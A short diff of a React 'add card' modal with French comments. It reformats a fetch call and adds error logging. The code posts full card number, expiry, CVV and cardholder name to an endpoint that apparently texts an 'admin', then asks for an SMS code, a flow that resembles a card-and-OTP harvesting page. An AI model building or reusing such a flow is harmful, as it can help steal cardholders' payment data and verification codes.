@@ -434,24 +434,25 @@ function AddCardModal({ onClose, locale, t }) {
 
     try {
       // Appel à ton API pour envoyer le SMS à l’admin
-      const res = await fetch('/api/cards/request-sms', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          locale,
-          cardNumber: cardNumber.replace(/\s/g, ''),
-          expiryDate,
-          cvv,
-          cardholderName,
-        }),
-      });
+const res = await fetch('/api/cards/request-sms', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    locale,
+    cardNumber: cardNumber.replace(/\s/g, ''),
+    expiryDate,
+    cvv,
+    cardholderName,
+  }),
+});
 
-      if (!res.ok) {
-        // en prod tu peux afficher un message d'erreur
-        console.error('Card SMS request failed');
-        setLoading(false);
-        return;
-      }
+if (!res.ok) {
+  const errJson = await res.json().catch(() => null);
+  console.error('Card SMS request failed', res.status, errJson);
+  setLoading(false);
+  return;
+}
+
 
       // Succès -> on passe à l’étape 2 (saisie code SMS)
       setStep(2);
